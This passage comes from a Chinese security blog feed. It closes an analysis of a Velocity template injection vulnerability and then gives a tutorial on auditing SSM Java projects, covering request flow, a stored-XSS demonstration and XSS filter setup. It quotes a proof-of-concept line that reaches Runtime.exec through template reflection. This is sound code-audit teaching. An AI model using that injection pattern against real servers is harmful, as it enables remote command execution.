rootString);</p><p>这里返回的是我们给$x所赋的值“”然后程序会判断该值是否为空</p><p>如果一开始我们没有执行#set($x=’’)为$x赋一个值的话，此时会执行下面的</p><p>EventHandlerUtil.invalidGetMethod()方法，该方法会因为$x的值为空而不会向下继续执行。</p><p>所以我们poc的第一步就需要先为一个变量赋值，赋任何值都可以。</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/120.png" alt="120"></p><p>接下来执行到下面这些代码时，就开始遍历当前ASTReference的两个子节点</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/121.png" alt="121"></p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/122.png" alt="122"></p><p>执行完ASTIdentifier类的execute返回一个Class对象</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/123.png" alt="123"></p><p>接下来就是遍历第二个节点也就是ASTMethod节点，</p><p>执行ASTMethod节点的execute方法。 </p><p>Execute方法中执行了method的invoke方法跟入</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/124.png" alt="124"></p><p>最调用doInvoke方法</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/125.png" alt="125"></p><p>我们看一下doInvoke方法的内容</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/126.png" alt="126"></p><p>这一路下来的反射调用到最终获取Runtime类的class对象我用更直观的方式重写了一下方便理解</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/127.png" alt="127"></p><p>这一系列的操作等同于Class.forName(“java.lang.Runtime”)</p><p>后面的poc的第三行</p><p>#set($ex=$rt.getRuntime().exec(‘open /Applications/Calculator.app/‘))</p><p>执行逻辑和上面的如出一辙，就不再深入分析了，感兴趣的朋友可以自己跟踪代码分析一下。</p><p>最后放一下最终的一个调用链</p><p><img src="/2020/05/31/velocity-mo-ban-zhu-ru-lou-dong-shen-du-fen-xi/128.png" alt="128"></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> CVE </tag>
            
            <tag> Web安全 </tag>
            
            <tag> 代码审计 </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java框架级SSM代码审计思路</title>
      <link href="/2020/05/31/java-kuang-jia-ji-ssm-dai-ma-shen-ji-si-lu/"/>
      <url>/2020/05/31/java-kuang-jia-ji-ssm-dai-ma-shen-ji-si-lu/</url>
      
        <content type="html"><![CDATA[<p><strong>Java框架级SSM代码审计思路</strong></p><p><a href="#ssm框架简介">1 SSM框架简介 1</a></p><p><a href="#springmvc">1.1 SpringMVC 2</a></p><p><a href="#spring">1.2 Spring 2</a></p><p><a href="#mybatis">1.3 Mybatis 2</a></p><p><a href="#servlet">1.4 Servlet 2</a></p><p><a href="#ssm框架代码执行流程和审计思路">2 SSM框架代码执行流程和审计思路 3</a></p><p><a href="#审计的出发点web.xml">2.1 审计的出发点web.xml 3</a></p><p><a href="#spring核心配置文件applicationcontext.xml">2.2 Spring核心配置文件applicationContext.xml<br>4</a></p><p><a href="#ssm之springmvc执行流程">2.3 SSM之SpringMVC执行流程 6</a></p><p><a href="#ssm之spring执行流程">2.4 SSM之Spring执行流程 9</a></p><p><a href="#ssm之mybatis执行流程">2.5 SSM之Mybatis执行流程 11</a></p><p><a href="#审计的重点filter过滤器">2.6 审计的重点filter过滤器 18</a></p><p><a href="#ssm框架审计思路总结">3 SSM框架审计思路总结 27</a></p><p><a href="#思路总结">3.1 思路总结 27</a></p><p><a href="#补充知识">3.2 补充知识 28</a></p><p><a href="#学习建议">3.3 学习建议 28</a></p><h1 id="SSM框架简介"><a href="#SSM框架简介" class="headerlink" title="SSM框架简介"></a>SSM框架简介</h1><p>SSM框架，即SpringMVC+Spring+Mybatis三个开源框架整合在一起的缩写。</p><p>在SSM框架之前生产环境中SSH框架占据多数，即Struts2+Spring+Hibernate三个开源框架整合而成。后因Struts2爆出众多高危漏洞，导致目前SSM逐渐代替SSH成为主流开发框架的选择。</p><p>审计SSM框架首先就要对MVC设计模式和，web三层架构有一定程度的了解，限于篇幅原因这里就简单介绍一下</p><h2 id="SpringMVC"><a href="#SpringMVC" class="headerlink" title="SpringMVC"></a>SpringMVC</h2><p>是一种基于Java的实现MVC设计模式的请求驱动类型的轻量级Web框架，使用了MVC架构模式的思想，将web层进行职责解耦，基于请求驱动指的就是使用请求-响应模型，框架的目的就是帮助我们简化开发。</p><h2 id="Spring"><a href="#Spring" class="headerlink" title="Spring"></a>Spring</h2><p>是分层的 Java SE/EE full-stack 轻量级开源框架，以 IOC（Inverse of<br>Control，控制反转）和 AOP（Aspect Oriented<br>Programming，面向切面编程）为内核，使用基本的 JavaBean 完成以前只可能由 EJB<br>完成的工作，取代了 EJB<br>臃肿和低效的开发模式，Spring的用途不仅仅限于服务器端的开发。从简单性、可测试性和松耦合性角度而言，绝大部分Java应用都可以从Spring中受益</p><h2 id="Mybatis"><a href="#Mybatis" class="headerlink" title="Mybatis"></a>Mybatis</h2><p>是支持定制化 SQL、存储过程以及高级映射的优秀的持久层框架。MyBatis<br>避免了几乎所有的 JDBC 代码和手动设置参数以及获取结果集。MyBatis<br>可以对配置和原生Map使用简单的 XML 或注解，将接口和 Java 的 POJOs(Plain Old Java<br>Objects,普通的 Java对象)映射成数据库中的记录。</p><h2 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h2><p>还有一项技术虽然名称没有出现在这三个开源框架中但是SpringMVC的底层就是以此技术进行构建的，这项技术就是Servlet</p><p>Servlet是基于Java技术的Web组件，由容器管理并产生动态的内容。Servlet与客户端通过Servlet容器实现的请求/响应模型进行交互。</p><p>相对以SSM框架搭建的java web项目进行审计，上述这些都是要有一定程度的了解的。</p><h1 id="SSM框架代码执行流程和审计思路"><a href="#SSM框架代码执行流程和审计思路" class="headerlink" title="SSM框架代码执行流程和审计思路"></a>SSM框架代码执行流程和审计思路</h1><h2 id="审计的出发点web-xml"><a href="#审计的出发点web-xml" class="headerlink" title="审计的出发点web.xml"></a>审计的出发点web.xml</h2><p>其实代码审计的核心思想就是追踪参数，而追踪参数的步骤就是程序执行的步骤，说白了代码审计就是一个跟踪程序执行步骤的一个过程，当我们知道了SSM框架的一个执行流程，自然就知道了如何如跟踪一个参数，剩下的就是去观察在参数传递的过程中有没有一些常见的漏洞点。</p><p>我们这里通过一个简单的Demo来描述一下SSM框架搭建的项目是如何完成一次用户请求，它的流程是怎么样的，而参数又是怎样被传递怎样被过滤的，当我们明白了这些，就可以尝试自己上手一些SSM的项目审计。</p><p>首先我把Demo的全部文件和文件结构粘贴出来</p><p><img src="/2020/05/31/java-kuang-jia-ji-ssm-dai-ma-shen-ji-si-lu/1.png" alt=""></p><p>这是一个简单的图书管理Demo目录，功能是对图书名称，数量和简介简单的增删改查</p><p>首先不管我们是审计一个项目还是包括Tomcat加载一个项目一般都是由web.xml这个文件开始的</p><p>当然一个项目中没有web.xml也是可以的，可以通过servlet3.0开始提供的一些新注解来达到和配置web.xml一样的效果，但是这样的项目很少会碰到，所以我们以主流的配置web.xml的项目来作为讲解。</p><p>Tomcat会加载web.xml文件读取文件中的内容</p><p><img src="/2020/05/31/java-kuang-jia-ji-ssm-dai-ma-shen-ji-si-lu/2.png" alt=""></p><p>web.xml文件主要的工作包括两部分：1、web.xml启动spring容器；2、DispathcheServlet的声明；3、其余工作是session过期，字符串编码等</p><p>首先是生成DispatcherServlet类,DispatcherServlet是前端控制器设计模式的实现，提供Spring<br>Web MVC的集中访问点（也就是把前端请求分发到目标controller），而且与Spring<br>IoC容器无缝集成，从而可以获得Spring的所有好处。</p><p>简单理解就是将我们的请求转发至我们的SpringMVC中去，交由我们SpringMVC的Controller来进行接下来的处理</p><p>然后下面有一个&lt;init-param&gt;子标签，是生成DispatcherServlet时的初始化参数contextConfigLocation参数，Spring会根据这个参数去加载所有逗号分隔的xml文件，如果没有这个参数，Spring默认加载WEB-INF/DispatcherServlet-servlet.xml文件</p><p>下面的&lt;servlet-mapping&gt;标签中还有一个子标签&lt;url-pattern&gt;里面的value是“/”代表拦截所有请求。</p><p>下面的&lt;filter&gt;标签放在后面讲</p><h2 id="Spring核心配置文件applicationContext-xml"><a href="#Spring核心配置文件applicationContext-xml" class="headerlink" title="Spring核心配置文件applicationContext.xml"></a>Spring核心配置文件applicationContext.xml</h2><p>然后我们根据加载顺序去看applicationContext.xml</p><p><img src="/2020/05/31/java-kuang-jia-ji-ssm-dai-ma-shen-ji-si-lu/3.png" alt=""></p><p>applicationContext.xml中包含了三个配置文件，这三个配置文件就是我们用Spring来整合SpringMVC和Mybaits的配置文件，其实这三个配置文件中的内容都可以直接写applicationContext.xml中因为applicationContext.xml是Spring的核心配置文件，例如生成Bean，配置连接池，生成sqlSessionFactory。但是为了便于理解，我们这些配置分别写在三个配置文件中，由applicationContext.xml将这三个xml进行关联，由下面这张截图我们可以清晰的看到applicationContext.xml将这三个配置文件关联了起来。</p><p><img src="/2020/05/31/java-kuang-jia-ji-ssm-dai-ma-shen-ji-si-lu/4.png" alt=""></p><p>首先数据经由DispatcherServlet派发至Spring-mvc的controller层所以我们先看Spring-mvc.xml这个配置文件</p><p><img src="/2020/05/31/java-kuang-jia-ji-ssm-dai-ma-shen-ji-si-lu/5.png" alt=""></p><p>&lt;mvc:annotation-driven /&gt;标签</p><p>如果在web.xml中servlet-mapping的url-pattern设置的是/，而不是如.do。表示将所有的文件，包含静态资源文件都交给spring<br>mvc处理。就需要用到&lt;mvc:annotation-driven<br>/&gt;了。如果不加，DispatcherServlet则无法区分请求是资源文件还是mvc的注解，而导致controller的请求报404错误</p><p>&lt;mvc:default-servlet-handler/&gt;</p><p>在Spring-mvc.xml中配置&lt;mvc:default-servlet-handler /&gt;后，会在Spring<br>MVC上下文中定义一个org.springframework.web.servlet.resource.DefaultServletHttpRequestHandler，它会像一个检查员，对进入DispatcherServlet的URL进行筛查，如果发现是静态资源的请求，就将该请求转由Web应用服务器默认的Servlet处理，如果不是静态资源的请求，才由DispatcherServlet继续处理，这么做是为了保证Spring-mvc优雅REST风格的资源URL。</p><p>剩下两项一个是指定了返回的view所在的路径，另一个是指定SpringMVC注解的扫描路径</p><p>不难看出这个配置文件中都是和Spring-mvc相关的配置。</p><h2 id="SSM之SpringMVC执行流程"><a href="#SSM之SpringMVC执行流程" class="headerlink" title="SSM之SpringMVC执行流程"></a>SSM之SpringMVC执行流程</h2><p>接下来就是我们SpringMVC<br>controller层接受前台传入的数据,这里我们让demo跑起来以方便演示和讲解</p><p><img src="/2020/05/31/java-kuang-jia-ji-ssm-dai-ma-shen-ji-si-lu/6.png" alt=""></p><p>这是我们的index首页，我们看下页面源码</p><p><img src="/2020/05/31/java-kuang-jia-ji-ssm-dai-ma-shen-ji-si-lu/7.png" alt=""></p><p>可以看到a标签的超链接是<a href="http://localhost:8080/SSMFrameWorkTest_war/book/allbook" target="_blank" rel="noopener">http://localhost:8080/SSMFrameWorkTest_war/book/allbook</a></p><p>${pageContext.request.contextPath}</p><p>是JSP取得绝对路径的方法,<br>也就是取出部署的应用程序名或者是当前的项目名称,这样当我们把项目部署到生产环境中时不容易出错</p><p>后台此时收到的请求路径为/book/allbook首先SpringMVC在项目启动时会去扫描我们指定的要扫描的路径也就是com.kuang.controller这个路径下的所有类，我们看下BookController这个类的代码</p><p><img src="/2020/05/31/java-kuang-jia-ji-ssm-dai-ma-shen-ji-si-lu/8.png" alt=""></p><p>SpringMVC会扫描这个类中的所有注解，当看到@Controller是会生成该controller的Bean，扫描到@RequestMappting注解的时候会将@RequestMappting中的URI和下面的方法形成映射。所以我们请求的URI是“/book/allBool”<br>SpringMVC就会将数据交由BookController类的list方法来处理</p><p>我们仔细观察list方法，里面调用了bookService参数的queryAllBook方法，这里使用到了两个注解@Autowired，@Qualifier，简单介绍下两个注解的作用</p><p>@Autowrite</p><p>作用：自动按照类型注入,只要有唯一的类型匹配就能注入成功，当传入的类型不唯一时，则会报错。</p><p>@Qualiier</p><p>作用：在自动按照类型注入的基础上，在按照bean的id注入。它在给类成员注入数据时，不能独立使用。但是再给方法的形参注入数据的时候，可以独立使用。</p><p>由此可以看到bookService参数的类型是BookService类型，通过注解自动注入的Bean的id叫做BookServiceImpl</p><h2 id="SSM之Spring执行流程"><a href="#SSM之Spring执行流程" class="headerlink" title="SSM之Spring执行流程"></a>SSM之Spring执行流程</h2><p>这里我们就要从SpringMVC的部分过渡到Spring的部分了,所谓的过渡就是我们从SpringMVC的Controller层去调用Service层而这Service就是我们使用Spring进行IOC控制和AOP编程的地方。</p><p>首先我们需要先要去看spring-service.xml这个配置文件，</p><p><img src="/2020/05/31/java-kuang-jia-ji-ssm-dai-ma-shen-ji-si-lu/9.png" alt=""></p><p>这里我们看到了一个很重要的东西<br>id为BookServiceImpl的bean，我们可以看到这个bean的class路径是com.kuang.service.BookServiceImpl，</p><p>&lt;bean&gt;这个标签就牵扯到了Spring一大核心功能点 就是IOC(Inversion of<br>Control)控制反转，名字听起来特别唬人，其实特别容易理解，就是本来写一个项目需要我们自己手动去new一个实例出来，用了Spring以后我们至于要把我们需要生成实例的那个类的路径，以及我们在new<br>一个实例时需要传入的的参数，传入参数的方法可以是通过构造方法，也可以通过set方法，我们还可以给这个bean起一个名称来方便我们调用（如果不用id参数之名的话那么这个bean的名称默认为<br>类名开头字母小写，比如BookServiceImpl，如不特别指定，那么生成的bean的名称就是bookServiceImpl）。Spring就会在启动时将这些我们指定好的类生成的实例放入IOC容器中供我们使用，通俗点说就是本来由我们手动生成实例的过程交由Spring来做了，这就是所谓的控制反转。</p><p>接下来我们去看BookServiceImpl这个类的详细信息</p><p><img src="/2020/05/31/java-kuang-jia-ji-ssm-dai-ma-shen-ji-si-lu/10.png" alt=""></p><p>首先看到该类是实现了BookService这个接口，ok我们先去看BookService这个接口</p><p><img src="/2020/05/31/java-kuang-jia-ji-ssm-dai-ma-shen-ji-si-lu/11.png" alt=""></p><p>可以看到接口中定义了四种方法，为了方便理解，这些方法的名字是对应着日常项目中最长用的操作数据库的四个方法即，增删改查。</p><p>好了，看完了接口我们来看接口的实现类也就是BookServiceImpl。</p><p><img src="/2020/05/31/java-kuang-jia-ji-ssm-dai-ma-shen-ji-si-lu/12.png" alt=""></p><p>由于实现了BookService这个接口，自然也就需要实现该接口下的所有方法，我们找到queryAllBook方法，发现queryAllBook调用了bookMapper参数的queryAllBook方法，而bookMapper是BookMapper类型的参数。</p><p>我们回过头来看spring-service.xml中的这一项配置，之前说了这一配置是将BookServiceImpl这个类生成一个bean并放入Spring<br>的IOC容器中，&lt;property&gt;标签的意思是通过该类提供的set方法在bean生成时向指定的参数注入value，name属性就是指定的参数的名称，可以看到我们BookServiceImpl中确实有一个私有参数名叫bookMapper</p><p>并且提供了该属性的set方法，<br>ref属性是指要注入的value是其他的Bean类型，如果传入的是一些基本类型或者String类型就不需要用ref<br>将ref改成value就可以</p><p><img src="/2020/05/31/java-kuang-jia-ji-ssm-dai-ma-shen-ji-si-lu/13.png" alt=""></p><p>这里我们可以看到我们通过ref属性向BookServiceImpl这个类中的bookMapper参数注入了一个value，这个value是一个其他的bean类型，这个bean的id叫做bookMapper。此时由于我们Service层的BookServiceImpl的queryAllBook方法的实现方式其实就是调用了id为bookMapper的bean的queryAllBook方法。所以这个id为bookMapper的bean就是程序执行的下一步。</p><h2 id="SSM之Mybatis执行流程"><a href="#SSM之Mybatis执行流程" class="headerlink" title="SSM之Mybatis执行流程"></a>SSM之Mybatis执行流程</h2><p>接下来就是是我们的web三层架构的数据访问层也就是我们Mybaits负责的部分，通常这一部分的包名会叫做xxxdao，也就是开发中常说的dao层，该包下面的类和接口通常都叫做xxxDao或者xxxMapper，当然不遵守这个规范也可以但是不推荐。此时我们的请求要从Spring负责的业务层过渡到Mybatis负责的数据层了，但是Mybaits和Spring的关系不像SpringMVC和Spring的关系一样可以无缝衔接，所以我们需要通过配置文件将Mybatis和Spring关联起来，这里我们看一下pom.xml</p><p><img src="/2020/05/31/java-kuang-jia-ji-ssm-dai-ma-shen-ji-si-lu/14.png" alt=""></p><p>可以看到我们导入的包除了Mybatis本身，还倒入了一个mybatis-spring的包，目的就是为了将Mybatis和Spring做结合，spring-dao.xml也就是用来整合Spring和Mybatis的配置文件。</p><p>刚才我们看到Spring启动加载bean时会注入一个id为bookMapper的bean但是我们并未在之前的任何配置文件包括注解中看到有这个bean的相关信息，所以我们接下来要看spring-dao.xml中有没有和这个bean有关的信息</p><p><img src="/2020/05/31/java-kuang-jia-ji-ssm-dai-ma-shen-ji-si-lu/15.png" alt=""></p><p>每项配置的作用基本都用注释的方式标明了</p><p>&lt;context:property-placeholder location=”classpath:database.properties”/&gt;</p><p>这里关联了一个properties文件</p><p><img src="/2020/05/31/java-kuang-jia-ji-ssm-dai-ma-shen-ji-si-lu/16.png" alt=""></p><p>里面是连接数据库和配置连接池时需要的信息，没什么好说的。</p><p>我们着重看这个配置</p><p><img src="/2020/05/31/java-kuang-jia-ji-ssm-dai-ma-shen-ji-si-lu/17.png" alt=""></p><p>这个配置通过生成MapperScannerConfigurer的bean来实现自动扫描com.kuang.dao下面的接口包，然后动态注入到Spring<br>IOC容器中，同样动态注入的bean的id默认为类名（开头字母小写），我们看下到目录下有哪些文件。</p><p><img src="/2020/05/31/java-kuang-jia-ji-ssm-dai-ma-shen-ji-si-lu/18.png" alt=""></p><p>我们看到有一个叫BookMapper的接口文件，这样就明白了之前生成BookServiceImpl这个bean是通过&lt;property&gt;也就是通过BookServiceImpl类中的</p><p>public void setBookMapper(BookMapper bookMapper) {</p><p>this.bookMapper = bookMapper;</p><p>}</p><p>方法注入的这个bookMapper是哪里来的了，是由我们配置了MapperScannerConfigurer这个bean后这个bean帮我们扫描dao包下的借口文件并生成bean然后再帮我们注入到Spring的IOC容器中，所以我们才可以在BookServiceImpl这个bean中通过&lt;property&gt;标签注入bookmapper这个bean</p><p>然后我们来看这项配置</p><p><img src="/2020/05/31/java-kuang-jia-ji-ssm-dai-ma-shen-ji-si-lu/19.png" alt=""></p><p>这里是生成一个id为sqlSessionFactory的bean，这里就要引出Mybatis中的两个关键对象即sqlSessionFactory和sqlSession。</p><p>简单介绍下这两个对象</p><p>SqlSessionFactory</p><p>SqlSessionFactory是MyBatis的关键对象，它是单个数据库映射关系经过编译后的内存镜像。SqlSessionFactory对象的实例可以通过SqlSessionBuilder对象获得，而SqlSessionBuilder则可以从XML配置文件或一个预先定制的Configuration的实例构建出SqlSessionFactory的实例。SqlSessionFactory是创建SqlSession的工厂。</p><p>SqlSession</p><p>SqlSession是执行持久化操作的对象，类似于JDBC中的Connection。它是应用程序与持久存储层之间执行交互操作的一个单线程对象。SqlSession对象完全包括以数据库为背景的所有执行SQL操作的方法，它的底层封装了JDBC连接，可以用SqlSession实例来直接执行已映射的SQL语句。</p><p>SqlSessionFactory和SqlSession的实现过程：</p><p>mybatis框架主要是围绕着SqlSessionFactory进行的，创建过程大概如下：</p><p>(1)、定义一个Configuration对象，其中包含数据源、事务、mapper文件资源以及影响数据库行为属性设置settings</p><p>(2)、通过配置对象，则可以创建一个SqlSessionFactoryBuilder对象</p><p>(3)、通过 SqlSessionFactoryBuilder 获得SqlSessionFactory 的实例。</p><p>(4)、SqlSessionFactory<br>的实例可以获得操作数据的SqlSession实例，通过这个实例对数据库进行</p><p>如果是spring和mybaits整合之后的配置文件,一般以这种方式实现,SqlSessionFactory的创建:</p><p>&lt;bean id=”sqlSessionFactory” class=”org.mybatis.spring.SqlSessionFactoryBean”&gt;</p><p>&lt;property name=”dataSource” ref=”dataSource”&gt;&lt;/property&gt;</p><p>&lt;property name=”mapperLocations”<br>value=”classpath:com/cn/mapper/*.xml”&gt;&lt;/property&gt;</p><p>&lt;/bean&gt;</p><p>SqlSessionFactoryBean是一个工厂Bean，根据配置来创建SqlSessionFactory</p><p>如果是单独的使用手动创建SqlSessionFactory和SqlSession话流程如下</p><p><img src="/2020/05/31/java-kuang-jia-ji-ssm-dai-ma-shen-ji-si-lu/20.png" alt=""></p><p>看完了SqlSessionFactory和SqlSession的基础知识我们同时注意到下面这个&lt;property&gt;标签的value属性，“classpath:mybatis-config.xml”</p><p><img src="/2020/05/31/java-kuang-jia-ji-ssm-dai-ma-shen-ji-si-lu/21.png" alt=""></p><p>这里又引入了一个xml配置文件，还记得我上面刚说过spring-dao.xml是用来整合Spring和Mybatis的么？这个mybatis-config.xml就是我们Mybatis的配置文件。</p><p>好了spring-dao.xml这个用来整合Spring和Mybatis的配置文件我们已经了解了，程序按着刚才的请求接着向下走。</p><p>我们刚在走到了BookServiceImpl类的queryAllBook方法，然后该方法又是调用了bookMapper的queryAllBook方法。现在我们清楚了bookMapper的类型是BookMapper</p><p>又从sping-dao.xml的配置文件中看到了该文件的位置位于com.kuang.dao路径下，我们现在就打开BookMapper.java文件看一看</p><p><img src="/2020/05/31/java-kuang-jia-ji-ssm-dai-ma-shen-ji-si-lu/22.png" alt=""></p><p>我们注意到这只是个接口，我们都知道接口是不能实例化的接口只是提供一个规范，这是我们就有疑问了，那我们调用的bookMapper的queryAllBook是怎么执行的？</p><p>我们在仔细看下dao目录下的文件，</p><p><img src="/2020/05/31/java-kuang-jia-ji-ssm-dai-ma-shen-ji-si-lu/23.png" alt=""></p><p>发现还有一个名字和BookMapper.java名字一样的xml文件，我们打开看一下内容。</p><p><img src="/2020/05/31/java-kuang-jia-ji-ssm-dai-ma-shen-ji-si-lu/24.png" alt=""></p><p>看到这个文件，虽然我们对mybatis的了解不多，但是我们应该大概明白了，为什么我们BookMapper明明只是接口，我们却可以实例化生成BookMapper的bean并且可以调用他的方法了。</p><p>但是只有BookMapper.java和BookMapper.xml显然不能就是Mybatis的全部了，两个文件之间此时除了名字相同以外还没有什么直接联系，所以我们还需要关联起来，我们来看看mybatis-config.xml这个Mybatis的配置文件</p><p><img src="/2020/05/31/java-kuang-jia-ji-ssm-dai-ma-shen-ji-si-lu/25.png" alt=""></p><p>我们看到了&lt;mappers&gt;这个标签的resource属性的value就是我们BookMapper.xml的路径MyBatis<br>是基于 sql 映射配置的框架，sql 语句都写在 Mapper 配置文件中，当构建 SqlSession<br>类之后，就需要去读取 Mapper 配置文件中的 sql 配置。而&lt;mappers&gt;<br>标签就是用来配置需要加载的 sql 映射配置文件路径的。</p><p>也就是说最终由我们的Spring帮我生成BookMapper的代理对象然后由Mybaits通过&lt;mappers&gt;标签将BookMapper代理对象中的方法和BookMapper.xml中的配置进行一一的映射，并最终执行其中的Sql语句。</p><p>我们看到我们此次请求最终调用的BookMapper的queryAllBook方法，这时我们就需要去BookMapper.xml去寻找与之对应的Sql语句了</p><p><img src="/2020/05/31/java-kuang-jia-ji-ssm-dai-ma-shen-ji-si-lu/26.png" alt=""></p><p>很容易就找到了</p><p>我们看到最后执行的sql语句是</p><p>SELECT * from ssmbuild.books</p><p>至此我们的请求已经完成从一开始的由DispatcherServlet这个前端控制器派发给SpringMVC并最终通过Mybatis<br>执行我们需要对数据库进行的操作。</p><p>生产环境的业务代码，会比这个Demo复杂，但是整体的执行流程和思路并不会有什么太大的变化，所以审计思路也是如此。</p><p>SSM框架有三种配置方式，即全局采用xml配置文件的形式，全局采取注解的配置方式，或者注解和xml配置文件配合使用的方式，区别只是在于写法不一样，执行流程不会因此发生太多改变。</p><h2 id="审计的重点filter过滤器"><a href="#审计的重点filter过滤器" class="headerlink" title="审计的重点filter过滤器"></a>审计的重点filter过滤器</h2><p>此时在将web.xml时还有一个标签说放在后面讲，就是web.xml的&lt;filter&gt;标签</p><p>SpringMVC时构建于Servlet之上的，所以Servlet中的过滤器自然也是可以使用，只不过不能配置在spring-mvc.xml中，而是要直接配置在web.xml中，因为是属于Servlet的技术嘛。</p><p>我们重回web.xml</p><p><img src="/2020/05/31/java-kuang-jia-ji-ssm-dai-ma-shen-ji-si-lu/27.png" alt=""></p><p>为了方便之前的讲解，我将这两个filter注释掉了。也就是说这两个filter并没有生效。我们以下面的filter-name为XSSEscape的filter来进行讲解。</p><p>首先我们此时程序是没有XSS防护的，所以存在存储型XSS漏洞，我们来尝试存储型XSS攻击</p><p><img src="/2020/05/31/java-kuang-jia-ji-ssm-dai-ma-shen-ji-si-lu/28.png" alt=""></p><p>我们点击新增功能</p><p><img src="/2020/05/31/java-kuang-jia-ji-ssm-dai-ma-shen-ji-si-lu/29.png" alt=""></p><p>看一下提交路径</p><p><img src="/2020/05/31/java-kuang-jia-ji-ssm-dai-ma-shen-ji-si-lu/30.png" alt=""></p><p>去后台找与之对应的方法</p><p><img src="/2020/05/31/java-kuang-jia-ji-ssm-dai-ma-shen-ji-si-lu/31.png" alt=""></p><p>找到后在这里下断点看传入参数的详细信息</p><p><img src="/2020/05/31/java-kuang-jia-ji-ssm-dai-ma-shen-ji-si-lu/32.png" alt=""></p><p>看到没有任何过滤XSS语句就这么直接传了进来</p><p><img src="/2020/05/31/java-kuang-jia-ji-ssm-dai-ma-shen-ji-si-lu/33.png" alt=""></p><p>如果我们此时想要防御这个XSS攻击就可以在web.xml中配置上我们的&lt;filter&gt;</p><p><img src="/2020/05/31/java-kuang-jia-ji-ssm-dai-ma-shen-ji-si-lu/34.png" alt=""></p><p>这里声明了了我在com.kuang.filter的包路径下又一个类叫XssFilter是一个过滤器</p><p>下面的&lt;dispatcher&gt;属性中的REQUEST的意思是</p><p>只要发起的操作是一次HTTP请求，比如请求某个URL、发起了一个GET请求、表单提交方式为POST的POST请求、表单提交方式为GET的GET请求。一次重定向则前后相当于发起了两次请求，这些情况下有几次请求就会走几次指定过滤器。</p><p>&lt;dispatcher&gt;属性2.4版本的servlet中添加的新的属性标签，总共有四个值REQUEST,FORWARD,INCLUDE和ERROR，以下把这四个值简单说明一下</p><p>1、REQUEST</p><p>只要发起的操作是一次HTTP请求，比如请求某个URL、发起了一个GET请求、表单提交方式为POST的POST请求、表单提交方式为GET的GET请求。一次重定向则前后相当于发起了两次请求，这些情况下有几次请求就会走几次指定过滤器。</p><p>2、FOWARD</p><p>只有当当前页面是通过请求转发转发过来的情形时，才会走指定的过滤器</p><p>3、INCLUDE</p><p>只要是通过&lt;jsp:include page=”xxx.jsp”<br>/&gt;，嵌入进来的页面，每嵌入的一个页面，都会走一次指定的过滤器。</p><p>4、ERROR</p><p>假如web.xml里面配置了&lt;error-page&gt;&lt;/error-page&gt;：</p><p>例如</p><p>&lt;error-page&gt;</p><p>&lt;error-code&gt;400&lt;/error-code&gt;</p><p>&lt;location&gt;/filter/error.jsp&lt;/location&gt;</p><p>&lt;/error-page&gt;</p><p>意思是HTTP请求响应的状态码只要是400、404、500三种状态码之一，容器就会将请求转发到error.jsp下，这就触发了一次error，走进了配置的DispatchFilter。需要注意的是注意一点的是，虽然把请求转发到error.jsp是一次forward的过程，但是配置成&lt;dispatcher&gt;FORWARD&lt;/dispatcher&gt;并不会走DispatchFilter这个过滤器。</p><p>这四种dispatcher方式可以单独使用，也可以组合使用，配置多个&lt;dispatcher&gt;&lt;/dispatcher&gt;<br>即可。</p><p>在审计的时候的过滤器&lt;dispatcher&gt;属性中使用的值也是我们关注的一个点，</p><p>&lt;url-pattern&gt;属性是指明我们要过滤访问哪些资源的请求，“/*”的意思就是拦截所有对后台的请求,<br>包括对一个简单的对jsp页面的GET请求，同时我们可以具体的指定拦截对某一资源的请求，同时也可以设置对某些资源的请求不过滤单独进行放过，</p><p>举例说明</p><p>&lt;filter&gt;</p><p>&lt;filter-name&gt;XSSEscape&lt;/filter-name&gt;</p><p>&lt;filter-class&gt;com.springtest.filter.XssFilter&lt;/filter-class&gt;</p><p>&lt;/filter&gt;</p><p>&lt;filter-mapping&gt;</p><p>&lt;filter-name&gt;XSSEscape&lt;/filter-name&gt;</p><p>&lt;url-pattern&gt;/com/app/UserControl&lt;/url-pattern&gt;</p><p>&lt;dispatcher&gt;REQUEST&lt;/dispatcher&gt;</p><p>&lt;/filter-mapping&gt;</p><p>既然等指定单独过滤特定资源，自然也就可以指定对特定资源的放行。</p><p>如果设置全局的资源请求过滤的话肯定是不合理的，生产环境中又很多静态资源是不需要进行过滤的，所以我们可以指定将这些资源进行放行，</p><p>例如</p><p>&lt;filter&gt;</p><p>&lt;filter-name&gt; XSSEscape &lt;/filter-name&gt;</p><p>&lt;filter-class&gt; com.springtest.filter.XssFilter &lt;/filter-class&gt;</p><p>&lt;init-param&gt;</p><p>&lt;!– 配置不需要被登录过滤器拦截的链接，只支持配后缀、前缀<br>及全路径，多个配置用逗号分隔 –&gt;</p><p>&lt;param-name&gt;excludedPaths&lt;/param-name&gt;</p><p>&lt;param-value&gt;/pages/*,*.html,*.js,*.ico&lt;/param-value&gt;</p><p>&lt;/init-param&gt;</p><p>&lt;/filter&gt;</p><p>&lt;filter-mapping&gt;</p><p>&lt;filter-name&gt; XSSEscape &lt;/filter-name&gt;</p><p>&lt;url-pattern&gt;/*&lt;/url-pattern&gt;</p><p>&lt;/filter-mapping&gt;</p><p>这样我们的serlvet在路径选择时当有对 html 